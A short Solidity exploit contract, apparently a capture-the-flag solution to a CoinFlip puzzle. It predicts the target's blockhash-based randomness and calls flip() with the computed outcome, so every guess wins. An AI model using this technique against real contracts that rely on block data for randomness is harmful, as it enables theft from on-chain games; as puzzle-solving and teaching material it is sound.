// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/utils/math/SafeMath.sol';
import './CoinFlip.sol';
contract CoinHack {
  CoinFlip coinContract = CoinFlip(address(0xDF245f1307a128071c5587Ece5acAD20c8864d33));  
  using SafeMath for uint256;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  
  function flipHack(bool _guess) public {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      coinContract.flip(_guess);
    } else {
      coinContract.flip(!_guess);

    }
  }
}
